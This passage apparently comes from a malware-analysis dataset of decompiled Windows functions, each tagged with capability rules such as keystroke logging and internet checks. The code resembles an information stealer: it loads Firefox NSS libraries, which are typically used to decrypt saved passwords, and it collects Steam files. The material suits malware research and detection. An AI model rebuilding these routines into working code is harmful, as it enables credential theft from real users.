(**0x457374)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    fcn.004230a0();\n    var_4h = 7;\n    (**0x457520)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100292) {\n        fcn.0042d62b();\n    }\n    uStackY100292 = 0xf;\n    uStackY100296 = 0;\n    auStackY100312[0] = auStackY100312[0] & 0xffffff00;\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    fcn.004227b0();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    uVar2 = fcn.004226f0();\n    fcn.00423ec0(uVar2);\n    var_4h = 8;\n    (**0x457520)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100292) {\n        fcn.0042d62b();\n    }\n    uStackY100292 = 0xf;\n    uStackY100296 = 0;\n    auStackY100312[0] = auStackY100312[0] & 0xffffff00;\n    (**0x457520)();\n    (**0x457520)();\n    fcn.00422630();\n    var_4h = 9;\n    (**0x457520)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100292) {\n        fcn.0042d62b();\n    }\n    uStackY100292 = 0xf;\n    uStackY100296 = 0;\n    auStackY100312[0] = auStackY100312[0] & 0xffffff00;\n    (**0x457520)();\n    (**0x457520)();\n    fcn.00422a50();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x4574fc)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    fcn.004232b0();\n    (**0x457520)();\n    uVar2 = *0x456b40;\n    (**0x457520)();\n    (**0x457520)();\n    fcn.00422870();\n    arg_ch = (**0x457418)();\n    if (piVar1 == NULL) {\n        *0x457814 = 0x10000;\n    }\n    else if (*piVar1 == 2) {\n        *0x457814 = fcn.0042bf30(*0x456dc8, arg_ch, 3);\n    }\n    else {\n        *0x457814 = 0x80000;\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(uVar2);\n    return;\n}\n",
        "token_count": 2030
    },
    "00413510": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00413510(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char *pcVar3;\n    int32_t arg_ch;\n    uint *puVar4;\n    uint uVar5;\n    uint unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uint var_17ch;\n    uint var_178h;\n    uint var_50h;\n    uint32_t var_48h;\n    uint var_38h;\n    uint32_t var_34h;\n    uint var_2ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4437e8;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_34h = 0xf;\n    var_38h = 0;\n    var_48h = var_48h & 0xffffff00;\n    pcVar3 = *0x457098;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    arg_ch = pcVar3 - (*0x457098 + 1);\n    pcVar3 = *0x457098;\n    var_10h = uVar2;\n    fcn.004090e0(*0x457098, arg_ch);\n    var_4h = 0;\n    if (*0x4576f8 == 0) {\n        puVar4 = fcn.00414be0(&var_2ch, &var_48h, \"vcruntime140.dll\");\n        var_4h._0_1_ = 1;\n        if (0xf < puVar4[5]) {\n            puVar4 = *puVar4;\n        }\n        if (*0x4572dc == NULL) {\n            *0x4576b0 = 0x10000;\n        }\n        else if (**0x4572dc == 1) {\n            *0x4576b0 = fcn.0040dcc0(\"vcruntime140.dll\");\n        }\n        else {\n            *0x4576b0 = 0x80000;\n        }\n        uVar5 = (**0x45757c)(0, var_50h);\n        (**0x457504)(uVar5);\n        fcn.0040e360(0, puVar4);\n        var_4h._0_1_ = 0;\n        if (0xf < var_18h) {\n            fcn.0042d62b(var_2ch);\n        }\n        puVar4 = fcn.00414be0(&var_2ch, &var_48h, \"softokn3.dll\");\n        var_4h._0_1_ = 2;\n        if (0xf < puVar4[5]) {\n            puVar4 = *puVar4;\n        }\n        if (*0x4572dc == NULL) {\n            *0x4576b0 = 0x10000;\n        }\n        else if (**0x4572dc == 1) {\n            *0x4576b0 = fcn.0040dcc0(\"softokn3.dll\");\n        }\n        else {\n            *0x4576b0 = 0x80000;\n        }\n        uVar5 = (**0x45757c)(0, var_50h);\n        (**0x457504)(uVar5);\n        fcn.0040e360(0, puVar4);\n        var_4h._0_1_ = 0;\n        if (0xf < var_18h) {\n            fcn.0042d62b(var_2ch);\n        }\n        puVar4 = fcn.00414be0(&var_2ch, &var_48h, \"nss3.dll\");\n        var_4h._0_1_ = 3;\n        if (0xf < puVar4[5]) {\n            puVar4 = *puVar4;\n        }\n        if (*0x4572dc == NULL) {\n            *0x4576b0 = 0x10000;\n        }\n        else if (**0x4572dc == 1) {\n            *0x4576b0 = fcn.0040dcc0(\"nss3.dll\");\n        }\n        else {\n            *0x4576b0 = 0x80000;\n        }\n        uVar5 = (**0x45757c)(0, var_50h);\n        (**0x457504)(uVar5);\n        fcn.0040e360(0, puVar4);\n        var_4h._0_1_ = 0;\n        if (0xf < var_18h) {\n            fcn.0042d62b(var_2ch);\n        }\n        puVar4 = fcn.00414be0(&var_2ch, &var_48h, \"msvcp140.dll\");\n        var_4h._0_1_ = 4;\n        if (0xf < puVar4[5]) {\n            puVar4 = *puVar4;\n        }\n        if (*0x4572dc == NULL) {\n            *0x4576b0 = 0x10000;\n        }\n        else if (**0x4572dc == 1) {\n            *0x4576b0 = fcn.0040dcc0(\"msvcp140.dll\");\n        }\n        else {\n            *0x4576b0 = 0x80000;\n        }\n        uVar5 = (**0x45757c)(0, var_50h);\n        (**0x457504)(uVar5);\n        fcn.0040e360(0, puVar4);\n        var_4h._0_1_ = 0;\n        if (0xf < var_18h) {\n            fcn.0042d62b(var_2ch);\n        }\n        puVar4 = fcn.00414be0(&var_2ch, &var_48h, \"mozglue.dll\");\n        var_4h._0_1_ = 5;\n        if (0xf < puVar4[5]) {\n            puVar4 = *puVar4;\n        }\n        if (*0x4572dc == NULL) {\n            *0x4576b0 = 0x10000;\n        }\n        else if (**0x4572dc == 1) {\n            *0x4576b0 = fcn.0040dcc0(\"mozglue.dll\");\n        }\n        else {\n            *0x4576b0 = 0x80000;\n        }\n        uVar5 = (**0x45757c)(0, var_50h);\n        (**0x457504)(uVar5);\n        fcn.0040e360(0, puVar4);\n        var_4h._0_1_ = 0;\n        if (0xf < var_18h) {\n            fcn.0042d62b(var_2ch);\n        }\n        puVar4 = fcn.00414be0(&var_2ch, &var_48h, \"freebl3.dll\");\n        var_4h = CONCAT31(var_4h._1_3_, 6);\n        if (0xf < puVar4[5]) {\n            puVar4 = *puVar4;\n        }\n        if (*0x4572dc == NULL) {\n            *0x4576b0 = 0x10000;\n        }\n        else if (**0x4572dc == 1) {\n            *0x4576b0 = fcn.0040dcc0(\"freebl3.dll\");\n        }\n        else {\n            *0x4576b0 = 0x80000;\n        }\n        uVar5 = (**0x45757c)(0, var_50h);\n        (**0x457504)(uVar5);\n        fcn.0040e360(0, puVar4);\n        if (0xf < var_18h) {\n            fcn.0042d62b(var_2ch);\n        }\n        *0x4576f8 = 1;\n    }\n    if (0xf < var_34h) {\n        fcn.0042d62b(var_48h, pcVar3, arg_ch, uVar2);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(unaff_ESI);\n    return;\n}\n",
        "token_count": 1924
    },
    "004139a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004139a0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *arg_8h_00;\n    uint var_464h;\n    uint var_438h;\n    uint var_324h;\n    uint var_21ch;\n    uint var_114h;\n    uint32_t var_8h;\n    \n    var_8h = *0x454664 ^ &stack0xfffffffc;\n    (**0x457374)(&var_324h, \"%s\\\\%s\");\n    arg_8h_00 = &var_464h;\n    iVar1 = (**0x4575e0)(&var_324h);\n    if (iVar1 != -1) {\n        do {\n            iVar2 = (**0x457550)(&var_438h, 0x44eba0);\n            if ((iVar2 != 0) && (iVar2 = (**0x457550)(&var_438h, 0x44eba4),  iVar2 != 0)) {\n                fcn.00434d30(&var_21ch, 0, 0x104);\n                fcn.00434d30(&var_114h, 0, 0x104);\n                (**0x457520)(&var_21ch, \"\\\\Soft\\\\Steam\\\\\");\n                (**0x457520)(&var_21ch, &var_438h);\n                (**0x457520)(&var_114h);\n                (**0x457520)(&var_114h, 0x44c8cc);\n                (**0x457520)(&var_114h, &var_438h);\n                if (*0x4572ec == NULL) {\n                    *0x457814 = 0x10000;\n                }\n                else if (**0x4572ec == 2) {\n                    *0x457814 = fcn.0042bf30(&var_21ch, 0, 2);\n                }\n                else {\n                    *0x457814 = 0x80000;\n                }\n            }\n            iVar2 = (**0x457438)(iVar1, &var_464h);\n        } while (iVar2 != 0);\n        (**0x4573a8)(iVar1);\n    }\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 519
    },
    "00414b60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414b60(int32_t param_1, char param_2)\n\n{\n    uint *in_EAX;\n    int32_t unaff_ESI;\n    \n    if (param_1 == 1) {\n        if (0xf < in_EAX[5]) {\n            in_EAX = *in_EAX;\n        }\n        *(in_EAX + unaff_ESI) = param_2;\n        return;\n    }\n    if (0xf < in_EAX[5]) {\n        in_EAX = *in_EAX;\n    }\n    fcn.00434d30(in_EAX + unaff_ESI, param_2, param_1);\n    return;\n}\n",
        "token_count": 152
    },
    "00414de0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00414de0(int32_t **param_1, uchar *param_2, uchar *param_3)\n\n{\n    uchar uVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t **ppiVar5;\n    int32_t *in_FS_OFFSET;\n    int32_t **var_8h;\n    uchar *var_ch_2;\n    uchar *var_10h;\n    uint var_ch;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x441950;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    piVar3 = var_10h + -var_ch_2;\n    piVar4 = var_8h[4];\n    if (((piVar4 <= piVar3) && (var_8h[5] != piVar3)) && (cVar2 = fcn.004093d0(piVar3, 1),  cVar2 != '\\0')) {\n        var_8h[4] = piVar4;\n        ppiVar5 = var_8h;\n        if (0xf < var_8h[5]) {\n            ppiVar5 = *var_8h;\n        }\n        *(ppiVar5 + piVar4) = 0;\n    }\n    var_4h = 0;\ncode_r0x00414e50:\n    do {\n        while( true ) {\n            if (var_ch_2 == var_10h) {\n                *in_FS_OFFSET = var_ch_3;\n                return;\n            }\n            uVar1 = *var_ch_2;\n            piVar4 = var_8h[4];\n            if (-piVar4 - 1U < 2) {\n                piVar4 = fcn.0042cb30(\"string too long\");\n            }\n            piVar3 = piVar4 + 1;\n            if (piVar3 == 0xffffffff) {\n                piVar4 = fcn.0042cb30(\"string too long\");\n            }\n            if (piVar3 <= var_8h[5]) break;\n            fcn.00409570(piVar3, piVar4);\n            if (piVar3 != NULL) goto code_r0x00414e9c;\ncode_r0x00414f2e:\n            var_ch_2 = var_ch_2 + 1;\n        }\n        if (piVar3 == NULL) {\n            var_8h[4] = NULL;\n            if (var_8h[5] < 0x10) {\n                *var_8h = 0;\n                var_ch_2 = var_ch_2 + 1;\n            }\n            else {\n                **var_8h = 0;\n                var_ch_2 = var_ch_2 + 1;\n            }\n            goto code_r0x00414e50;\n        }\ncode_r0x00414e9c:\n        ppiVar5 = var_8h;\n        if (0xf < var_8h[5]) {\n            ppiVar5 = *var_8h;\n        }\n        *(ppiVar5 + var_8h[4]) = uVar1;\n        var_8h[4] = piVar3;\n        if (var_8h[5] < 0x10) {\n            *(var_8h + piVar3) = 0;\n            goto code_r0x00414f2e;\n        }\n        *(*var_8h + piVar3) = 0;\n        var_ch_2 = var_ch_2 + 1;\n    } while( true );\n}\n",
        "token_count": 828
    },
    "00414f50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414f50(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    uint32_t unaff_EBX;\n    int32_t **unaff_ESI;\n    \n    piVar2 = unaff_ESI[4];\n    if (-piVar2 - 1U <= unaff_EBX) {\n        piVar2 = fcn.0042cb30(\"string too long\");\n    }\n    if (unaff_EBX != 0) {\n        piVar1 = piVar2 + unaff_EBX;\n        if (piVar1 == 0xffffffff) {\n            piVar2 = fcn.0042cb30(\"string too long\");\n        }\n        if (unaff_ESI[5] < piVar1) {\n            fcn.00409570(piVar1, piVar2);\n            if (piVar1 == NULL) {\n                return;\n            }\n        }\n        else if (piVar1 == NULL) {\n            unaff_ESI[4] = NULL;\n            if (0xf < unaff_ESI[5]) {\n                **unaff_ESI = 0;\n                return;\n            }\n            *unaff_ESI = 0;\n            return;\n        }\n        piVar2 = unaff_ESI[4];\n        if (unaff_EBX == 1) {\n            if (unaff_ESI[5] < 0x10) {\n                *(unaff_ESI + piVar2) = arg_8h;\n            }\n            else {\n                *(*unaff_ESI + piVar2) = arg_8h;\n            }\n        }\n        else {\n            ppiVar3 = unaff_ESI;\n            if (0xf < unaff_ESI[5]) {\n                ppiVar3 = *unaff_ESI;\n            }\n            fcn.00434d30(ppiVar3 + piVar2, arg_8h);\n        }\n        unaff_ESI[4] = piVar1;\n        if (0xf < unaff_ESI[5]) {\n            *(*unaff_ESI + piVar1) = 0;\n            return;\n        }\n        *(unaff_ESI + piVar1) = 0;\n    }\n    return;\n}\n",
        "token_count": 501
    },
    "00415020": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00415020(int32_t param_1, int32_t param_2, uint32_t param_3)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint32_t *arg_ch;\n    uint *puVar5;\n    uint32_t uVar6;\n    char *arg_8h;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_10h;\n    uint var_20h;\n    uint32_t var_24h;\n    uint *var_2ch;\n    uint var_3ch;\n    uint32_t var_40h;\n    uint var_48h;\n    uint32_t var_5ch;\n    uint var_644h;\n    uint var_640h;\n    uint var_5c8h;\n    uint var_558h;\n    uint var_548h;\n    uint var_544h;\n    uint var_504h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    uint in_stack_fffff958;\n    uint in_stack_fffff95c;\n    uint in_stack_fffff960;\n    uint noname_3;\n    uint *arg_8h_00;\n    uint var_65ch;\n    uint *var_654h;\n    uint *var_650h;\n    uint var_64ch;\n    uint *var_644h_2;\n    int32_t var_640h_2;\n    uint *var_63ch;\n    uint32_t var_638h;\n    uint var_628h;\n    uint32_t var_624h;\n    uint32_t var_61ch;\n    uint var_60ch;\n    uint32_t var_608h;\n    uint32_t var_600h;\n    uint var_5f0h;\n    uint32_t var_5ech;\n    uint32_t var_5e4h;\n    uint var_5d4h;\n    uint32_t var_5d0h;\n    uint32_t var_5c8h_2;\n    uint var_5b8h;\n    uint32_t var_5b4h;\n    uint32_t var_5ach;\n    uint var_59ch;\n    uint32_t var_598h;\n    uint32_t var_590h;\n    uint var_580h;\n    uint32_t var_57ch;\n    uint32_t var_574h;\n    uint32_t var_564h;\n    uint32_t var_560h;\n    uint32_t var_558h_2;\n    uint var_548h_2;\n    uint32_t var_544h_2;\n    uint32_t var_53ch;\n    uint var_52ch;\n    uint32_t var_528h;\n    uint32_t var_520h;\n    uint var_510h;\n    uint32_t var_50ch;\n    uint var_504h_2;\n    uint var_11ch;\n    uint32_t var_14h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h_2;\n    \n    uStack12 = 0x442abe;\n    var_ch_2 = *in_FS_OFFSET;\n    var_14h_2 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.00415020::var_ch_2;\n    var_640h_2 = param_1;\n    var_544h_2 = 0xf;\n    var_548h_2 = 0;\n    var_558h_2 = var_558h_2 & 0xffffff00;\n    var_4h_2 = 3;\n    fcn.00434d30();\n    if (param_2 == 0) {\n        iVar3 = (**0x457500)();\n        arg_8h = (iVar3 < 0) - 1 & &fcn.00415020::var_504h_2;\n        pcVar4 = arg_8h;\n        do {\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n    }\n    else {\n        iVar3 = (**0x457500)();\n        arg_8h = (iVar3 < 0) - 1 & &fcn.00415020::var_504h_2;\n        pcVar4 = arg_8h;\n        do {\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n    }\n    fcn.004090e0(arg_8h, pcVar4 - (arg_8h + 1));\n    puVar5 = &fcn.00415020::var_558h_2;\n    arg_8h_00 = &fcn.00415020::var_5c8h_2;\n    noname_3 = 0x41510d;\n    fcn.00417440(arg_8h_00, puVar5, &fcn.00415020::var_10h);\n    var_644h_2 = &stack0xfffff958;\n    var_4h_2._0_1_ = 4;\n    fcn.00417500();\n    fcn.004243e0(in_stack_fffff958, in_stack_fffff95c, in_stack_fffff960, noname_3, arg_8h_00, puVar5);\n    var_4h_2 = CONCAT31(var_4h_2._1_3_, 6);\n    if (0xf < var_5b4h) {\n        fcn.0042d62b(var_5c8h_2);\n    }\n    var_5b4h = 0xf;\n    var_5b8h = 0;\n    var_5c8h_2 = var_5c8h_2 & 0xffffff00;\n    var_644h_2 = var_650h;\n    var_63ch = var_654h;\n    if (var_654h != var_650h) {\n        do {\n            var_598h = 7;\n            var_59ch = 0;\n            var_5ach = var_5ach & 0xffff0000;\n            fcn.004170c0(var_63ch, 0);\n            var_4h_2._0_1_ = 7;\n            fcn.00424090();\n            var_4h_2._0_1_ = 8;\n            fcn.00417440(&fcn.00415020::var_638h, &fcn.00415020::var_558h_2, &fcn.00415020::var_10h);\n            var_4h_2 = CONCAT31(var_4h_2._1_3_, 9);\n            arg_ch = fcn.004097a0(&fcn.00415020::var_61ch);\n            uVar6 = var_574h;\n            var_560h = 0xf;\n            var_564h = 0;\n            var_574h = var_574h & 0xffffff00;\n            if (&fcn.00415020::var_574h != arg_ch) {\n                var_560h = 0xf;\n                var_564h = 0;\n                var_574h = uVar6 & 0xffffff00;\n                if (arg_ch[5] < 0x10) {\n                    fcn.0042d8e0(&fcn.00415020::var_574h, arg_ch, arg_ch[4] + 1);\n                }\n                else {\n                    var_574h = *arg_ch;\n                    *arg_ch = 0;\n                }\n                var_564h = arg_ch[4];\n                var_560h = arg_ch[5];\n                arg_ch[4] = 0;\n                arg_ch[5] = 0;\n            }\n            if (0xf < var_608h) {\n                fcn.0042d62b(var_61ch);\n            }\n            var_608h = 0xf;\n            var_60ch = 0;\n            var_61ch = var_61ch & 0xffffff00;\n            if (0xf < var_624h) {\n                fcn.0042d62b(var_638h);\n            }\n            var_624h = 0xf;\n            var_628h = 0;\n            var_638h = var_638h & 0xffffff00;\n            var_4h_2._0_1_ = 0xe;\n            if (0xf < var_5ech) {\n                fcn.0042d62b(var_600h);\n            }\n            var_5f0h = 0;\n            var_600h = var_600h & 0xffffff00;\n            var_5ech = 0xf;\n            fcn.00424090();\n            var_4h_2._0_1_ = 0xf;\n            fcn.00417440(&fcn.00415020::var_53ch, &fcn.00415020::var_558h_2, &fcn.00415020::var_10h);\n            var_4h_2._0_1_ = 0x10;\n            fcn.004097a0(&fcn.00415020::var_590h);\n            var_4h_2 = CONCAT31(var_4h_2._1_3_, 0x11);\n            puVar5 = fcn.00424130(&fcn.00415020::var_5e4h);\n            if (7 < puVar5[5]) {\n                puVar5 = *puVar5;\n            }\n            uVar6 = (**0x457364)(puVar5);\n            if ((uVar6 == 0xffffffff) || ((uVar6 & 0x10) != 0)) {\n                bVar2 = false;\n            }\n            else {\n                bVar2 = true;\n            }\n            if (7 < var_5d0h) {\n                fcn.0042d62b(var_5e4h);\n            }\n            var_5d0h = 7;\n            var_5d4h = 0;\n            var_5e4h = var_5e4h & 0xffff0000;\n            if (0xf < var_57ch) {\n                fcn.0042d62b(var_590h);\n            }\n            var_57ch = 0xf;\n            var_580h = 0;\n            var_590h = var_590h & 0xffffff00;\n            if (0xf < var_528h) {\n                fcn.0042d62b(var_53ch);\n            }\n            var_4h_2._0_1_ = 0xe;\n            var_528h = 0xf;\n            var_52ch = 0;\n            var_53ch = var_53ch & 0xffffff00;\n            if (0xf < var_50ch) {\n                fcn.0042d62b(var_520h);\n            }\n            var_50ch = 0xf;\n            var_510h = 0;\n            var_520h = var_520h & 0xffffff00;\n            if (bVar2) {\n                *(var_640h_2 + 0x1c) = *(var_640h_2 + 0x1c) + 1;\n                *0x4572f4 = *0x4572f4 + *(var_640h_2 + 0x1c);\n                *0x4572e0 = *0x4572e0 + 1;\n            }\n            fcn.00434d30(&fcn.00415020::var_11ch, 0, 0x104);\n            (**0x457520)(&fcn.00415020::var_11ch, 0x44c8cc);\n            (**0x457520)(&fcn.00415020::var_11ch, 0x44eddc);\n            (**0x457520)(&fcn.00415020::var_11ch, 0x44ede0);\n            (**0x457520)(&fcn.00415020::var_11ch, 0x44ede4);\n            (**0x457520)(&fcn.00415020::var_11ch, 0x44ede4);\n            (**0x457520)(&fcn.00415020::var_11ch, 0x44ede8);\n            (**0x457520)(&fcn.00415020::var_11ch, 0x44edec);\n            (**0x457520)(&fcn.00415020::var_11ch, 0x44edf0);\n            (**0x457520)(&fcn.00415020::var_11ch, 0x44c8cc);\n            puVar5 = var_2ch;\n            if (var_40h < 0x10) {\n                puVar5 = &fcn.00415020::var_2ch;\n            }\n            (**0x457520)(&fcn.00415020::var_11ch, puVar5);\n            (**0x457520)(&fcn.00415020::var_11ch, 0x44c8cc);\n            puVar5 = fcn.00424090();\n            var_4h_2._0_1_ = 0x12;\n            if (0xf < puVar5[5]) {\n                puVar5 = *puVar5;\n            }\n            (**0x457520)(&fcn.00415020::var_11ch, puVar5);\n            var_4h_2._0_1_ = 0xe;\n            if (0xf < var_50ch) {\n                fcn.0042d62b(var_520h);\n            }\n            fcn.00424090();\n            var_4h_2._0_1_ = 0x13;\n            fcn.00417440(&fcn.00415020::var_53ch, &fcn.00415020::var_558h_2, &fcn.00415020::var_10h);\n            var_4h_2._0_1_ = 0x14;\n            puVar5 = fcn.004097a0(&fcn.00415020::var_520h);\n            var_4h_2 = CONCAT31(var_4h_2._1_3_, 0x15);\n            if (0xf < puVar5[5]) {\n                puVar5 = *puVar5;\n            }\n            iVar3 = (**0x4573b4)(puVar5, 0x80000000, 3, 0, 3, 0x80, 0);\n            if (iVar3 != -1) {\n                (**0x45736c)(iVar3, &fcn.00415020::var_65ch);\n                (**0x4573b8)(iVar3);\n            }\n            if (0xf < var_50ch) {\n                fcn.0042d62b(var_520h);\n            }\n            var_50ch = 0xf;\n            var_510h = 0;\n            var_520h = var_520h & 0xffffff00;\n            if (0xf < var_528h) {\n                fcn.0042d62b(var_53ch);\n            }\n            var_4h_2._0_1_ = 0xe;\n            var_528h = 0xf;\n            var_52ch = 0;\n            var_53ch = var_53ch & 0xffffff00;\n            if (0xf < var_57ch) {\n                fcn.0042d62b(var_590h);\n            }\n            fcn.00424090();\n            var_4h_2._0_1_ = 0x16;\n            fcn.00417440(&fcn.00415020::var_53ch, &fcn.00415020::var_558h_2, &fcn.00415020::var_10h);\n            var_4h_2._0_1_ = 0x17;\n            fcn.004097a0(&fcn.00415020::var_520h);\n            var_4h_2 = CONCAT31(var_4h_2._1_3_, 0x18);\n            if (*(var_640h_2 + 0x20) == NULL) {\n                *0x457814 = 0x10000;\n            }\n            else if (**(var_640h_2 + 0x20) == 2) {\n                *0x457814 = fcn.0042bf30(&fcn.00415020::var_11ch, 0, 2);\n            }\n            else {\n                *0x457814 = 0x80000;\n            }\n            if (0xf < var_50ch) {\n                fcn.0042d62b(var_520h);\n            }\n            var_50ch = 0xf;\n            var_510h = 0;\n            var_520h = var_520h & 0xffffff00;\n            if (0xf < var_528h) {\n                fcn.0042d62b(var_53ch);\n            }\n            var_528h = 0xf;\n            var_52ch = 0;\n            var_53ch = var_53ch & 0xffffff00;\n            if (0xf < var_57ch) {\n                fcn.0042d62b(var_590h);\n            }\n            if (0xf < var_560h) {\n                fcn.0042d62b(var_574h);\n            }\n            var_4h_2 = CONCAT31(var_4h_2._1_3_, 6);\n            if (7 < var_598h) {\n                fcn.0042d62b(var_5ach);\n            }\n            var_63ch = var_63ch + 7;\n        } while (var_63ch != var_644h_2);\n    }\n    puVar5 = var_654h;\n    if (var_654h != NULL) {\n        for (; puVar5 != var_650h; puVar5 = puVar5 + 7) {\n            if (7 < puVar5[5]) {\n                fcn.0042d62b(*puVar5);\n            }\n            puVar5[5] = 7;\n            puVar5[4] = 0;\n            *puVar5 = 0;\n        }\n        fcn.0042d62b(var_654h);\n    }\n    var_654h = NULL;\n    var_650h = NULL;\n    var_64ch = 0;\n    if (0xf < var_544h_2) {\n        fcn.0042d62b(var_558h_2);\n    }\n    var_544h_2 = 0xf;\n    var_548h_2 = 0;\n    var_558h_2 = var_558h_2 & 0xffffff00;\n    if (0xf < var_24h) {\n        fcn.0042d62b(var_10h);\n    }\n    var_24h = 0xf;\n    var_20h = 0;\n    var_10h = var_10h & 0xffffff00;\n    if (0xf < var_40h) {\n        fcn.0042d62b(var_2ch);\n    }\n    var_40h = 0xf;\n    var_3ch = 0;\n    var_2ch = var_2ch & 0xffffff00;\n    if (0xf < var_5ch) {\n        fcn.0042d62b(var_48h);\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 4410
    },
    "004158e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004158e0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_ECX;\n    int32_t *unaff_EBX;\n    int32_t unaff_ESI;\n    uint *puVar4;\n    uint *arg_8h_00;\n    uint var_960h;\n    uint var_95ch;\n    uint var_958h;\n    uint var_954h;\n    uint var_928h;\n    uint var_814h;\n    uint var_42ch;\n    uint var_324h;\n    uint var_21ch;\n    uint var_114h;\n    uint32_t var_8h;\n    \n    var_8h = *0x454664 ^ &stack0xfffffffc;\n    fcn.00434d30(&var_21ch, 0, 0x104);\n    fcn.00434d30(&var_814h, 0, 1000);\n    iVar1 = (**0x457500)(0, 0x1a, 0, 0, &var_814h);\n    (**0x457520)(&var_21ch, &var_814h & (iVar1 < 0) - 1);\n    if (unaff_ESI == 0) {\n        (**0x457374)(&var_42ch, \"%s\\\\%s\\\\%s\", &var_21ch, arg_8h, in_ECX);\n    }\n    else {\n        (**0x457374)(&var_42ch, 0x44edf4, &var_21ch, arg_8h);\n    }\n    arg_8h_00 = &var_42ch;\n    iVar1 = (**0x4575e0)(arg_8h_00, &var_954h);\n    if (iVar1 != -1) {\n        do {\n            iVar2 = (**0x457550)(&var_928h, 0x44eba0);\n            if ((iVar2 != 0) && (iVar2 = (**0x457550)(&var_928h, 0x44eba4),  iVar2 != 0)) {\n                if (unaff_ESI == 0) {\n                    (**0x457374)(&var_324h, \"%s\\\\%s\\\\%s\", &var_21ch, arg_8h, &var_928h);\n                }\n                else {\n                    (**0x457374)(&var_324h, \"%s\\\\%s\\\\%s\\\\%s\", &var_21ch, arg_8h, &var_928h, in_ECX);\n                }\n                uVar3 = (**0x457470)(&var_324h);\n                if ((uVar3 != 0xffffffff) && ((uVar3 & 0x10) == 0)) {\n                    fcn.00434d30(&var_114h, 0, 0x104);\n                    (**0x457520)(&var_114h, 0x44c8cc);\n                    (**0x457520)(&var_114h, 0x44eddc);\n                    (**0x457520)(&var_114h, 0x44ede0);\n                    (**0x457520)(&var_114h, 0x44ede4);\n                    (**0x457520)(&var_114h, 0x44ede4);\n                    (**0x457520)(&var_114h, 0x44ede8);\n                    